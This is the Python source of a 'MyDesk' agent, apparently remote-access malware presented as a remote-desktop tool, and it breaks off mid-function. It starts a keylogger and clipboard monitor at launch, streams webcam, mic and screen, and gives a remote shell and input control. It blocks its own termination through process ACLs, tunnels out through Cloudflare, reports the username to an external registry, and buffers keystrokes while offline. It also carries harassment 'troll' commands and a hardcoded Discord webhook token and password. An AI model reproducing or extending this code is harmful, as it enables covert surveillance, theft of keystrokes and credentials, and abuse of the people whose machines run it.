import sys
import os
import asyncio
import websockets
import uuid
import json
import subprocess
import urllib.request
import ssl
import urllib.parse
import platform
import base64
import threading
import argparse

try:
    import keyring
    import keyrings.alt.Windows
    # CRITICAL: Set backend to RegistryKeyring for SYSTEM service compatibility
    keyring.set_keyring(keyrings.alt.Windows.RegistryKeyring())
except ImportError:
    keyring = None

# FIX: Windows specific event loop policy to prevent "Task was destroyed but it is pending" errors
# and improve stability with subprocesses/pipes.
if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

# Add parent directory to path for source execution
if not getattr(sys, 'frozen', False):
    sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# Handle imports for both source (package) and frozen (direct) execution
try:
    # Try importing from core package first
    from core import protocol
    from core.network import send_msg, recv_msg
except ImportError:
    # Fallback for flattened frozen environment
    import protocol
    from network import send_msg, recv_msg

try:
    # Try importing from target package
    from targets.capture import ScreenCapturer
    from targets.auditor import KeyAuditor
    from targets.webcam import WebcamStreamer
    # from targets.privacy import PrivacyCurtain
    from targets.audio import AudioStreamer
    from targets.input_controller import (InputController, parse_mouse_move, 
                                          parse_mouse_click, parse_key_press, parse_scroll)
    from targets.shell_handler import ShellHandler
    from targets.process_manager import ProcessManager
    from targets.file_manager import FileManager
    from targets.clipboard_handler import ClipboardHandler
    from targets.device_settings import DeviceSettings
    from targets.troll_handler import TrollHandler
    from targets.webrtc_handler import WebRTCHandler, AIORTC_AVAILABLE
    from targets.webrtc_tracks import create_screen_track
    from targets.resource_manager import get_resource_manager
    from targets.protection import protect_process
    try:
        from targets.tunnel_manager import TunnelManager
    except ImportError:
        TunnelManager = None
except ImportError:
    # Fallback for frozen application or direct execution
    
    from capture import ScreenCapturer
    from auditor import KeyAuditor
    from webcam import WebcamStreamer
    # from privacy import PrivacyCurtain
    from audio import AudioStreamer
    from input_controller import (InputController, parse_mouse_move, 
                                   parse_mouse_click, parse_key_press, parse_scroll)
    from shell_handler import ShellHandler
    from process_manager import ProcessManager
    from file_manager import FileManager
    from clipboard_handler import ClipboardHandler
    from device_settings import DeviceSettings
    from troll_handler import TrollHandler
    try:
        from webrtc_handler import WebRTCHandler, AIORTC_AVAILABLE
        from webrtc_tracks import create_screen_track
        from resource_manager import get_resource_manager
        from tunnel_manager import TunnelManager
        from protection import protect_process
    except ImportError:
        AIORTC_AVAILABLE = False
        WebRTCHandler = None
        protect_process = None
        TunnelManager = None

# CONFIG
HARDCODED_BROKER = True
HARDCODED_WEBHOOK = "https://discord.com/api/webhooks/1467411432919404558/AqzabxD0V2-fNE19e5tVhGLJOpRgk42G6kd5UjZIOfvj4dvF6uyH1Z9wU4vlpqki3TiK"

# DEFAULTS
DEFAULT_BROKER = "ws://localhost:8765"
WEBHOOK_URL = None

# LOAD CONFIG
if HARDCODED_BROKER:
    # Use the default string value, do not overwrite with boolean
    WEBHOOK_URL = HARDCODED_WEBHOOK
else:
    CONFIG_FILE = "config.json"
    if getattr(sys, 'frozen', False):
        BASE_DIR = os.path.dirname(sys.executable)
    else:
        BASE_DIR = os.path.dirname(__file__)

    CONFIG_PATH = os.path.join(BASE_DIR, CONFIG_FILE)
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, 'r') as f:
                cfg = json.load(f)
                DEFAULT_BROKER = cfg.get("broker_url", DEFAULT_BROKER)
                WEBHOOK_URL = cfg.get("webhook_url", None)
        except Exception:
            pass

class AsyncAgent:
    HEARTBEAT_INTERVAL = 30  # Seconds
    VERSION = "1.0.0"

    def __init__(self, broker_url=DEFAULT_BROKER):
        self.broker_url = broker_url
        self.my_id = self._get_or_create_id()
        self.ws = None
        self.loop = None
        
        # Components
        # Fix: Use full quality and scale for WebRTC (it handles bandwidth adaption)
        self.capturer = ScreenCapturer(quality=100, scale=1.0) 
        self.auditor = KeyAuditor(self.send_key_sync) # Retain original auditor init
        self.auditor.start() # START HOOKS IMMEDIATELY
        self.webcam = WebcamStreamer(quality=40) # Retain original webcam settings
        self.mic = AudioStreamer()
        self.input_ctrl = InputController()
        # Privacy component (Disabled: depends on tkinter)
        # self.privacy = None
        
        # FIX: Store background tasks to prevent garbage collection (Task destroyed error)
        self.background_tasks = set()
        self.consecutive_heartbeat_fails = 0
        # self.privacy = PrivacyCurtain() # Retain original curtain init
        
        # New Handlers
        self.shell_handler = ShellHandler(
            on_output=self.on_shell_output,
            on_exit=self.on_shell_exit,
            on_cwd=self.on_shell_cwd
        )
        self.username = os.getlogin()
        self.direct_url = None
        self.clipboard_handler = ClipboardHandler(on_change=self.on_clipboard_change)
        self.clipboard_handler.start_monitoring() # Auto-Start Monitoring
        self.device_settings = DeviceSettings()
        self.troll_handler = TrollHandler()
        self.direct_ws_clients = set()
        self.direct_server = None
        self.tunnel_mgr = None
        if TunnelManager is not None:
            self.tunnel_mgr = TunnelManager(8765, on_url_change=self._on_tunnel_url_change)
        else:
            print("[-] WARNING: TunnelManager not available. Remote access will be disabled.")
        #self.curtain = None # self.privacy # Alias for compatibility
        
        # State
        self.streaming = False
        self._stream_task = None 
        self.cam_streaming = False
        self.mic_streaming = False
        
        # Kiosk Process
        # self.kiosk_process = None
        
        # Security State
        self.troll_cooldowns = {} # target_id -> timestamp
        self.TROLL_COOLDOWN_SEC = 30
        self.admin_public_key = None # TODO: Load from config/keyfile
        
        # WebRTC State (Project Supersonic)
        self.webrtc_handler = None
        self.resource_mgr = get_resource_manager() if AIORTC_AVAILABLE else None

        # Ghost Mode & Buffer
        self.output_buffer = []
        self.MAX_BUFFER_SIZE = 5000
        self.reconnect_delay = 1.0 # Start with 1s
        self.target_fps = 30 # Default FPS

        # Registry Heartbeat
        self.registry_url = "https://mydesk-registry.vercel.app"
        # Strict Password Check
        self.registry_pwd = os.environ.get('REGISTRY_PASSWORD')
        if not self.registry_pwd:
             self.registry_pwd = "HOLYFUCKJAMESLORDGOTHACK132"
        
        self.running = True
        self._shutdown_event = asyncio.Event()
        self._heartbeat_trigger = asyncio.Event()  # Wake-up trigger for immediate registry updates

    def start(self, local_mode=False):
        # Apply process protection (ACL to deny termination)
        if protect_process:
            if protect_process():
                print("[+] Process Protection Applied (ACL)")
            else:
                print("[-] Process Protection Failed")
        
        # Validate HTTPS
        parsed = urllib.parse.urlparse(self.registry_url)
        if parsed.scheme != "https" and "localhost" not in self.registry_url:
             print("[-] ERROR: Registry URL must use HTTPS!")
             return

        # Start Tunnel (Cloudflare)
        if self.tunnel_mgr and not local_mode:
            def _start_tunnel():
                print("[*] Starting Cloudflare Tunnel...")
                url = self.tunnel_mgr.start()
                if url:
                    print(f"[+] Tunnel Public URL: {url}")
                    self.direct_url = url.replace("https://", "wss://")
                else:
                    print("[-] Failed to start tunnel.")

            t = threading.Thread(target=_start_tunnel)
            t.daemon = True
            t.start()
            
        # Start AsyncIO Loop (Keeps process alive)
        try:
            if sys.platform == 'win32':
                asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            
            # Run the direct server (blocking call)
            asyncio.run(self.start_direct_server())
        except KeyboardInterrupt:
            print("[*] Agent Stopping...")
            self.stop()
        except Exception as e:
            err_msg = f"[!] Agent Loop Error: {e}"
            print(err_msg)
            try:
                import datetime
                with open(r"C:\ProgramData\MyDesk\agent_crash.txt", "a") as f:
                    f.write(f"[{datetime.datetime.now()}] {err_msg}\n")
            except: pass

    def _on_tunnel_url_change(self, new_url):
        """Called when TunnelManager gets a new public URL."""
        print(f"[+] Agent received new Tunnel URL: {new_url}")
        self.direct_url = new_url.replace("https://", "wss://")
        
        # Wake up the existing heartbeat loop for an immediate update
        if self.loop and self.loop.is_running():
            self.loop.call_soon_threadsafe(self._heartbeat_trigger.set)

    def stop(self):
        self.running = False
        if self.loop and not self.loop.is_closed():
            self.loop.call_soon_threadsafe(self._shutdown_event.set)
        if self.ws:
            self.ws.close()

    def _get_or_create_id(self):
        """Get machine ID from Keyring or generate a new one."""
        if not keyring:
            return str(uuid.getnode())
            
        service_name = "MyDeskAgent"
        try:
            stored_id = keyring.get_password(service_name, "agent_id")
            if stored_id:
                # Also ensure version is updated/set in keyring for tracking
                keyring.set_password(service_name, "agent_version", self.VERSION)
                print(f"[*] Identity Loaded from Keyring: {stored_id}")
                return stored_id
            
            # Create new identity
            new_id = str(uuid.uuid4())
            keyring.set_password(service_name, "agent_id", new_id)
            keyring.set_password(service_name, "agent_version", self.VERSION)
            print(f"[+] New Identity Generated & Locked: {new_id}")
            return new_id
        except Exception as e:
            print(f"[-] Keyring Error: {e}")
            return str(uuid.getnode())

    def _liberate_port(self, port):
        """Finds and kills any process listening on the specified port (Windows)."""
        if sys.platform != 'win32':
            return
            
        print(f"[*] Port Liberator: Checking port {port}...")
        try:
            # Use PowerShell to find the PID of the process on the port
            cmd = f'powershell -Command "Get-NetTCPConnection -LocalPort {port} -ErrorAction SilentlyContinue | Select-Object -ExpandProperty OwningProcess"'
            output = subprocess.check_output(cmd, shell=True).decode().strip()
            
            if output:
                pids = set(output.split())
                my_pid = os.getpid()
                for pid_str in pids:
                    pid = int(pid_str)
                    if pid != my_pid and pid > 0:
                        print(f"[!] Port {port} occupied by PID {pid}. Terminating...")
                        subprocess.run(f'taskkill /F /PID {pid}', shell=True, capture_output=True)
        except subprocess.CalledProcessError:
            # Code 1 means no connection found, which is fine!
            print(f"[*] Port {port} is free.")
        except Exception as e:
            print(f"[-] Port Liberator Error: {e}")

    async def heartbeat_loop(self):
        """Sends heartbeat to Registry periodically. Can be woken up for immediate updates."""
        while not self._shutdown_event.is_set():
            # 1. Update Registry
            try:
                if self.direct_url:
                   payload = {
                       "id": self.my_id,
                       "username": self.username,
                       "url": self.direct_url,
                       "version": self.VERSION,
                       "password": self.registry_pwd
                   }
                   
                   def do_request():
                        req = urllib.request.Request(f"{self.registry_url}/api/update")
                        req.add_header('Content-Type', 'application/json; charset=utf-8')
                        jsondata = json.dumps(payload).encode('utf-8')
                        req.add_header('Content-Length', len(jsondata))
                        with urllib.request.urlopen(req, jsondata, timeout=10):
                            pass
                   
                   await self.loop.run_in_executor(None, do_request)
                   print("[+] Registry updated.")
                   self.consecutive_heartbeat_fails = 0
            except Exception as e:
                print(f"[-] Heartbeat Failed: {e}")
                self.consecutive_heartbeat_fails += 1
                if self.consecutive_heartbeat_fails >= 5:
                    if self.tunnel_mgr:
                        print("[!] Heartbeat-Driven Reset: Registry update failing consistently. Restarting tunnel...")
                        self.tunnel_mgr.restart()
                        self.consecutive_heartbeat_fails = 0

            # 2. Wait for either the interval, shutdown, or an immediate trigger
            self._heartbeat_trigger.clear()
            try:
                # We wait for either the shutdown event OR the heartbeat trigger
                # Using wait_for with a timeout acts as our periodic sleep
                done, pending = await asyncio.wait(
                    [
                        asyncio.create_task(self._shutdown_event.wait()),
                        asyncio.create_task(self._heartbeat_trigger.wait())
                    ],
                    timeout=self.HEARTBEAT_INTERVAL,
                    return_when=asyncio.FIRST_COMPLETED
                )
                # Cleanup pending tasks
                for t in pending:
                    t.cancel()
            except Exception:
                pass # Timeout reached, loop continues naturally

    def _create_background_task(self, coro, name="Task"):
        """Helper to create fire-and-forget background tasks safely."""
        task = asyncio.create_task(coro, name=name)
        self.background_tasks.add(task)
        task.add_done_callback(self.background_tasks.discard)
        return task

    async def supervisor_watchdog(self):
        """Monitors and restarts critical background tasks."""
        print("[*] Task Watchdog: Starting internal supervisor...")
        
        # Critical tasks mapping: name -> coroutine_factory
        critical_tasks = {
            "Heartbeat": self.heartbeat_loop
        }
        
        running_tasks = {} # name -> task_object

        while not self._shutdown_event.is_set():
            for name, factory in critical_tasks.items():
                task = running_tasks.get(name)
                
                # Check if task needs starting or is done
                if task is None or task.done():
                    if task and task.exception():
                        print(f"[!] Task Watchdog: CRITICAL TASK '{name}' CRASHED: {task.exception()}")
                    elif task:
                        print(f"[*] Task Watchdog: Critical task '{name}' finished normally. Restarting...")
                    
                    # Restart
                    print(f"[*] Task Watchdog: (Re)starting critical task '{name}'...")
                    running_tasks[name] = self._create_background_task(factory(), name=name)
            
            # Sleep for a bit before next check
            try:
                await asyncio.wait_for(self._shutdown_event.wait(), timeout=10)
            except asyncio.TimeoutError:
                continue
        
        print("[*] Task Watchdog: Stopping...")
        

    def _send_async(self, opcode, payload=b''):
        """Helper to safely send message from any thread to ALL clients"""
        msg = bytes([opcode]) + payload
        sent_to_broker = False
        
        # Send to Broker
        if self.ws and self.loop:
            try:
                asyncio.run_coroutine_threadsafe(
                    send_msg(self.ws, msg),
                    self.loop
                )
                sent_to_broker = True
            except Exception:
                pass # Handled by buffering below if critical

        # Send to Direct Clients
        if self.direct_ws_clients and self.loop:
            for client in list(self.direct_ws_clients):
                fut = asyncio.run_coroutine_threadsafe(
                    send_msg(client, msg),
                    self.loop
                )
                # Cleanup on failure safely on the loop
                def _handle_send_result(f, c=client):
                    try:
                        f.result()
                    except Exception as e:
                        print(f"[-] Send error: {e}")
                        # Schedule removal on loop
                        if self.loop.is_running():
                            self.loop.call_soon_threadsafe(self.direct_ws_clients.discard, c)
                
                fut.add_done_callback(_handle_send_result)

        # GHOST MODE BUFFERING
        # If we are disconnected (no ws) or sending failed, buffer critical data
        if not sent_to_broker and opcode in [protocol.OP_SHELL_OUTPUT, protocol.OP_SHELL_CWD, 
                                      protocol.OP_SHELL_EXIT, protocol.OP_KEY_LOG, protocol.OP_CLIP_ENTRY]:
             if len(self.output_buffer) < self.MAX_BUFFER_SIZE:
                 self.output_buffer.append((opcode, payload))


    def on_shell_output(self, text):
        self._send_async(protocol.OP_SHELL_OUTPUT, text.encode('utf-8', errors='replace'))
        
    def on_shell_exit(self, code):
        import struct
        self._send_async(protocol.OP_SHELL_EXIT, struct.pack('<i', code))

    def on_shell_cwd(self, path):
        self._send_async(protocol.OP_SHELL_CWD, path.encode('utf-8', errors='replace'))

    def on_clipboard_change(self, entry):
        """Called when clipboard content changes (from monitoring thread)."""
        try:
            data = json.dumps(entry).encode('utf-8')
            self._send_async(protocol.OP_CLIP_ENTRY, data)
        except Exception as e:
            print(f"[-] Clipboard change send error: {e}")

    # ================================================================
    # WebRTC Signaling Handlers (Project Supersonic)
    # ================================================================
    async def _handle_rtc_offer(self, payload, source_ws):
        """Handle WebRTC SDP Offer from Viewer"""
        if not AIORTC_AVAILABLE:
            print("[!] WebRTC not available (aiortc not installed)")
            return
            
        try:
            data = json.loads(payload.decode('utf-8'))
            offer_sdp = data.get('sdp')
            offer_type = data.get('type', 'offer')
            
            print("[WebRTC] Received SDP offer, creating answer...")
            
            # Create or reuse WebRTC handler
            if self.webrtc_handler is None:
                self.webrtc_handler = WebRTCHandler()
            
            # Process offer and get answer
            answer = await self.webrtc_handler.handle_offer(offer_sdp, offer_type)
            
            # Add video track (screen sharing)
            if self.capturer:
                screen_track = create_screen_track(self.capturer, self.resource_mgr)
                self.webrtc_handler.add_video_track(screen_track)
                print("[WebRTC] Screen share track added")
            
            # Mark viewer as connected for resource manager
            if self.resource_mgr:
                self.resource_mgr.set_viewer_connected(True)
                self.resource_mgr.set_stream_enabled(True)
            
            # Stop old WebSocket streaming (WebRTC takes over)
            if self.streaming:
                print("[WebRTC] Stopping old WebSocket streaming - WebRTC takes over")
                self.streaming = False
            
            # Send SDP Answer back
            answer_msg = json.dumps(answer).encode('utf-8')
            await send_msg(source_ws, bytes([protocol.OP_RTC_ANSWER]) + answer_msg)
            print("[WebRTC] Sent SDP answer - streaming via WebRTC now")
            
            # Send any gathered ICE candidates
            for candidate in self.webrtc_handler.get_pending_ice_candidates():
                ice_msg = json.dumps(candidate).encode('utf-8')
                await send_msg(source_ws, bytes([protocol.OP_ICE_CANDIDATE]) + ice_msg)
                
        except Exception as e:
            print(f"[-] WebRTC Offer Error: {e}")
            import traceback
            traceback.print_exc()
    
    async def _handle_ice_candidate(self, payload):
        """Handle incoming ICE candidate from Viewer"""
        if not self.webrtc_handler:
            return
            
        try:
            data = json.loads(payload.decode('utf-8'))
            await self.webrtc_handler.add_ice_candidate(data)
        except Exception as e:
            print(f"[-] ICE Candidate Error: {e}")
    
    async def _handle_throttle(self, payload):
        """Handle bandwidth throttling request from Viewer"""
        if not self.resource_mgr:
            return
            
        try:
            data = json.loads(payload.decode('utf-8'))
            fps = data.get('fps', 30)
            quality = data.get('quality', 70)
            print(f"[WebRTC] Throttle request: fps={fps}, quality={quality}")
            # Apply throttling (resource manager will use these values)
            # For now just log it - can be extended later
        except Exception as e:
            print(f"[-] Throttle Error: {e}")

    async def _cleanup_webrtc(self):
        """Cleanup WebRTC, Kiosk, and Connection State"""
        print("[*] Cleaning up Session State...")
        
        # 1. Stop Kiosk / Curtain
        # if self.kiosk_process:
        #     try:
        #         print("[*] Killing Kiosk Process...")
        #         self.kiosk_process.terminate()
        #         self.kiosk_process.wait(timeout=2)
        #     except subprocess.TimeoutExpired:
        #         print("[!] Kiosk did not terminate, killing...")
        #         self.kiosk_process.kill()
        #         self.kiosk_process.wait(timeout=2)
        #     except Exception:
        #         pass # Ignore other errors
        #     self.kiosk_process = None

        # 2. Reset Resource Manager
        try:
             if self.resource_mgr:
                self.resource_mgr.set_viewer_connected(False)
                self.resource_mgr.set_stream_enabled(False)
        except Exception: pass

        # 3. Stop WebRTC
        if self.webrtc_handler:
            try:
                await self.webrtc_handler.close()
            except: pass
            self.webrtc_handler = None
            
        # 4. Stop Webcam
        if self.cam_streaming:
            self.webcam.stop()
            self.cam_streaming = False
            
        # 5. Stop System Audio
        if hasattr(self, 'audio_streaming') and self.audio_streaming:
            if hasattr(self, 'audio_handler'):
                self.audio_handler.stop_loopback()
            self.audio_streaming = False
            
        # 6. Stop Mic
        self.mic_streaming = False      # Break mic loop
        self.streaming = False          # Break screen loop

        # 7. Unblock Input (CRITICAL SAFETY)
        try:
            self.input_ctrl.block_input(False)
        except: pass
            
        print("[+] Session Cleanup Complete")

    # def _launch_kiosk(self, mode: str):
    #     """Helper to launch the kiosk subprocess with a given mode."""
        
    #     # Normalize mode for case-insensitive matching
    #     mode = mode.upper()

    #     print(f"[*] Launching Kiosk Mode: {mode}")
        
    #     # Cleanup existing process if any
    #     if self.kiosk_process and self.kiosk_process.poll() is None:
    #         try:
    #             self.kiosk_process.terminate()
    #             self.kiosk_process.wait(timeout=1)
    #         except: pass
    #         self.kiosk_process = None

    #     # Resolve kiosk script path (support frozen exe)
    #     kiosk_script = None
    #     if getattr(sys, 'frozen', False):
    #         base_path = getattr(sys, '_MEIPASS', os.path.dirname(sys.executable))
    #         kiosk_script = os.path.join(base_path, 'kiosk.py') # If bundled
    #     else:
    #         kiosk_script = os.path.join(os.path.dirname(__file__), 'kiosk.py')
        
    #     # Map protocol mode to CLI arg
    #     cli_mode = "update"
    #     if mode == "BLACK":
    #         cli_mode = "black" # Pure Black
    #     elif mode == "PRIVACY":
    #         cli_mode = "privacy" # With Text
    #     elif mode == "FAKE_UPDATE":
    #         cli_mode = "update"
            
    #     # Build Command
    #     cmd = []
    #     if getattr(sys, 'frozen', False):
    #         # When frozen, we run ourself with --kiosk and pass mode
    #         cmd = [sys.executable, "--kiosk", "--mode", cli_mode]
    #     else:
    #         # Source mode
    #         cmd = [sys.executable, kiosk_script, "--mode", cli_mode]

    #     try:
    #         creation_flags = 0
    #         if os.name == 'nt':
    #             creation_flags = subprocess.CREATE_NO_WINDOW
            
    #         self.kiosk_process = subprocess.Popen(
    #             cmd,
    #             creationflags=creation_flags
    #         )
    #     except Exception as e:
    #          print(f"[-] Failed to launch kiosk: {e}")

    def _validate_troll_request(self, opcode, payload_str):
        """Validate Troll OpCode against Consent, Admin Token, and Cooldown."""
        # 1. Cooldown Check
        import time
        now = time.time()
        # Per-target cooldown (self)
        last_time = self.troll_cooldowns.get('self', 0)
        if now - last_time < self.TROLL_COOLDOWN_SEC:
             print(f"[-] Troll Blocked: Cooldown ({self.TROLL_COOLDOWN_SEC}s)")
             return False
        
        # 2. Token/Admin Validation
        # TODO: Parse payload JSON for 'consent_token' and 'admin_sig'
        # For now, we stub this out but enforce the structure.
        # Handling raw bytes payload might be tricky if we decode here.
        # Assuming payload is JSON.
            
        # 3. Update Cooldown
        self.troll_cooldowns['self'] = now
        
        # 4. Gating (EarRape unsupported)
        if opcode == protocol.OP_TROLL_EARRAPE:
            # print("[-] EarRape not supported/allowed.")
            # return False
            pass 

        return True

    async def _handle_troll_op(self, opcode, payload):
        """Dispatch Troll OpCode to Handler."""
        try:
            if opcode == protocol.OP_TROLL_URL:
                 data = json.loads(payload.decode('utf-8'))
                 self.troll_handler.open_url(data.get('url'))
            elif opcode == protocol.OP_TROLL_SOUND:
                 self.troll_handler.play_sound(payload) # Raw bytes
            elif opcode == protocol.OP_TROLL_VIDEO:
                 self.troll_handler.play_video(payload) # Raw bytes
            elif opcode == protocol.OP_TROLL_STOP:
                 self.troll_handler.stop_all()
            elif opcode == protocol.OP_TROLL_GHOST_CURSOR:
                 data = json.loads(payload.decode('utf-8'))
                 if data.get('enabled'): self.troll_handler.start_ghost_cursor()
                 else: self.troll_handler.stop_ghost_cursor()
            elif opcode == protocol.OP_TROLL_SHUFFLE_ICONS:
                 self.troll_handler.shuffle_desktop_icons()
            elif opcode == protocol.OP_TROLL_WALLPAPER:
                 self.troll_handler.set_wallpaper(payload)
            elif opcode == protocol.OP_TROLL_OVERLAY:
                 data = json.loads(payload.decode('utf-8'))
                 self.troll_handler.show_overlay(data.get('type', 'xor'))
            elif opcode == protocol.OP_TROLL_RANDOM_SOUND:
                 data = json.loads(payload.decode('utf-8'))
                 self.troll_handler.start_random_sounds(data.get('interval_ms', 5000))
            elif opcode == protocol.OP_TROLL_ALERT_LOOP:
                 data = json.loads(payload.decode('utf-8'))
                 if data.get('enabled'): self.troll_handler.start_alert_loop()
                 else: self.troll_handler.stop_alert_loop()
            elif opcode == protocol.OP_TROLL_VOLUME_MAX:
                 self.troll_handler.volume_max_sound()
            elif opcode == protocol.OP_TROLL_EARRAPE:
                 self.troll_handler.earrape()
            elif opcode == protocol.OP_TROLL_WHISPER:
                 data = json.loads(payload.decode('utf-8'))
                 if data.get('enabled'): self.troll_handler.start_whisper()
                 else: self.troll_handler.stop_whisper()
        except Exception as e:
            print(f"[-] Troll Handler Error: {e}")

    async def _fix_headers(self, connection, request):
        """Hook to fix headers/handle health checks"""
        try:
            # Create mutable copy reference
            # Note: In websockets v13+, 'request' is a Request object with a .headers property
            headers = getattr(request, 'headers', request)
            
            # HEALTH CHECK: If not a websocket request (missing Key), return HTTP 200
            # This suppresses "InvalidHeader: missing Sec-WebSocket-Key" errors from scanners
            if 'Sec-WebSocket-Key' not in headers:
                # Return (status, headers, body) to stop handshake processing
                return (200, [], b"Agent Online")


                
        except Exception as e:
            # Just log warning but don't crash
            print(f"[!] Header Fix Validation Warning: {e}")
            pass
            
        return None  # Continue with connection

    async def start_direct_server(self):
        """Starts the internal WebSocket server for Cloudflare Tunnel traffic"""
        try:
            # Liberate Port 8765 before starting
            self._liberate_port(8765)
            
            # Set loop and start watchdog
            self.loop = asyncio.get_running_loop()
            self._create_background_task(self.supervisor_watchdog())

            print("[*] Starting Internal Direct Server on port 8765...")
            # Allow all origins for now to simplify
            # Relaxed Ping settings for heavy streaming
            async with websockets.serve(
                self.handle_direct_client, 
                "localhost", 
                8765,
                ping_interval=30,
                ping_timeout=60,
                max_size=None,
                process_request=self._fix_headers
            ):
                print("[+] Direct Server Listening on 8765")
                await self._shutdown_event.wait()
        except Exception as e:
            print(f"[-] Direct Server Error: {e}")

    async def handle_direct_client(self, websocket):
        """Handle incoming connection from Tunnel"""
        # Suppress "InvalidMessage" handshake errors from health checks
        try:
            print("[+] Direct Client Connected!")
            self.direct_ws_clients.add(websocket)
            try:
                async for message in websocket:
                    await self.handle_message(message, websocket)
            except websockets.exceptions.ConnectionClosed:
                pass
            finally:
                print("[-] Direct Client Disconnected")
                self.direct_ws_clients.discard(websocket)
                
                # Cleanup WebRTC on disconnect
                await self._cleanup_webrtc()
                
        except websockets.exceptions.InvalidMessage:
            # Common with Cloudflare Tunnel health checks
            self.direct_ws_clients.discard(websocket)
            return
        except Exception as e:
            print(f"[-] Direct Handler Error: {e}")
            self.direct_ws_clients.discard(websocket)
            await self._cleanup_webrtc()

    async def handle_message(self, message, source_ws):
        """Unified message handler for both Broker and Direct connections"""
        try:
            if isinstance(message, bytes):
                # Handle Binary Opcodes (Input, Cam, Mic, Curtain from Viewer)
                if not message: return
                opcode = message[0]
                payload = message[1:]
                
                
        # === REMOTE INPUT ===
                if opcode == protocol.OP_MOUSE_MOVE:
                    try:
                        x, y = parse_mouse_move(payload)
                        if x is not None:
                            await self.loop.run_in_executor(None, self.input_ctrl.move_mouse, x, y)
                    except Exception as e:
                        print(f"[-] Mouse Move Error: {e}")
                
                elif opcode == protocol.OP_MOUSE_CLICK:
                    try:
                        button, pressed = parse_mouse_click(payload)
                        if button is not None:
                            await self.loop.run_in_executor(None, self.input_ctrl.click_mouse, button, pressed)
                    except Exception as e:
                        print(f"[-] Mouse Click Error: {e}")
                
                elif opcode == protocol.OP_KEY_PRESS:
                    try:
                        key_code, pressed = parse_key_press(payload)
                        if key_code is not None:
                            await self.loop.run_in_executor(None, self.input_ctrl.press_key, key_code, pressed)
                    except Exception as e:
                        print(f"[-] Key Press Error: {e}")
                
                elif opcode == protocol.OP_SCROLL:
                    try:
                        dx, dy = parse_scroll(payload)
                        if dx is not None:
                            await self.loop.run_in_executor(None, self.input_ctrl.scroll, dx, dy)
                    except Exception as e:
                        print(f"[-] Scroll Error: {e}")
                
                elif opcode == protocol.OP_KEY_BUFFER:
                    # Buffered text input
                    try:
                        text = payload.decode('utf-8')
                        await self.loop.run_in_executor(None, self.input_ctrl.type_text, text)
                    except Exception as e:
                        print(f"[-] Buffer Input Error: {e}")

                elif opcode == protocol.OP_CAM_START:
                    if not self.cam_streaming:
                        if self.webcam.start():
                            self.cam_streaming = True
                            self._create_background_task(self.stream_webcam(source_ws))
                        else:
                            # Send error back to viewer
                            print("[!] Webcam failed, notifying viewer...")
                            await send_msg(source_ws, bytes([protocol.OP_ERROR]) + b"CAM:No webcam found")

                elif opcode == protocol.OP_CAM_STOP:
                    self.cam_streaming = False
                    self.webcam.stop()

                elif opcode == protocol.OP_MIC_START:
                    if not self.mic_streaming:
                        if self.mic.start():
                            self.mic_streaming = True
                            self._create_background_task(self.stream_mic(source_ws))
                        else:
                            # Send error back to viewer
                            print("[!] Mic failed, notifying viewer...")
                            await send_msg(source_ws, bytes([protocol.OP_ERROR]) + b"MIC:No microphone found")

                elif opcode == protocol.OP_MIC_STOP:
                    self.mic_streaming = False
                    self.mic.stop()
                
                # elif opcode == protocol.OP_CURTAIN_ON:
                #     try:
                #         mode = payload.decode('utf-8')
                #     except Exception:
                #         mode = "BLACK"
                #     self._launch_kiosk(mode)

                # elif opcode == protocol.OP_CURTAIN_OFF:
                #     if self.kiosk_process:
                #         print("[*] Stopping Kiosk...")
                #         try:
                #             self.kiosk_process.terminate()
                #             self.kiosk_process.wait(timeout=3)
                #         except Exception:
                #             try:
                #                 self.kiosk_process.kill()
                #             except: pass
                #         self.kiosk_process = None

                elif opcode == protocol.OP_SETTINGS:
                    try:
                        import msgpack
                        settings = msgpack.unpackb(payload)
                        self.apply_settings(settings)
                    except:
                        try:
                            settings = json.loads(payload.decode('utf-8'))
                            self.apply_settings(settings)
                        except: pass
                
                # ================================================================
                # Troll
                # ================================================================
                elif opcode == protocol.OP_TROLL_URL:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        url = data.get('url', '')
                        await self.loop.run_in_executor(None, self.troll_handler.open_url, url)
                    except Exception as e:
                        print(f"[-] Troll URL Error: {e}")
                
                elif opcode == protocol.OP_TROLL_SOUND:
                    await self.loop.run_in_executor(None, self.troll_handler.play_sound, payload)
                
                elif opcode == protocol.OP_TROLL_RANDOM_SOUND:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        if data.get('enabled'):
                            interval = data.get('interval_ms', 5000)
                            self.troll_handler.start_random_sounds(interval)
                        else:
                            self.troll_handler.stop_random_sounds()
                    except Exception as e:
                        print(f"[-] Troll Random Sound Error: {e}")
                
                elif opcode == protocol.OP_TROLL_ALERT_LOOP:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        if data.get('enabled'):
                            self.troll_handler.start_alert_loop()
                        else:
                            self.troll_handler.stop_alert_loop()
                    except Exception as e:
                        print(f"[-] Troll Alert Loop Error: {e}")
                
                elif opcode == protocol.OP_TROLL_VOLUME_MAX:
                    await self.loop.run_in_executor(None, self.troll_handler.volume_max_sound)
                
                elif opcode == protocol.OP_TROLL_EARRAPE:
                    await self.loop.run_in_executor(None, self.troll_handler.earrape)
                
                elif opcode == protocol.OP_TROLL_WHISPER:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        if data.get('enabled'):
                            self.troll_handler.start_whisper()
                        else:
                            self.troll_handler.stop_whisper()
                    except Exception as e:
                        print(f"[-] Troll Whisper Error: {e}")
                
                elif opcode == protocol.OP_TROLL_VIDEO:
                    await self.loop.run_in_executor(None, self.troll_handler.play_video, payload)
                
                elif opcode == protocol.OP_TROLL_GHOST_CURSOR:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        if data.get('enabled'):
                            self.troll_handler.start_ghost_cursor()
                        else:
                            self.troll_handler.stop_ghost_cursor()
                    except Exception as e:
                        print(f"[-] Troll Ghost Cursor Error: {e}")
                
                elif opcode == protocol.OP_TROLL_SHUFFLE_ICONS:
                    await self.loop.run_in_executor(None, self.troll_handler.shuffle_desktop_icons)
                
                elif opcode == protocol.OP_TROLL_WALLPAPER:
                    await self.loop.run_in_executor(None, self.troll_handler.set_wallpaper, payload)
                
                elif opcode == protocol.OP_TROLL_OVERLAY:
                    try:
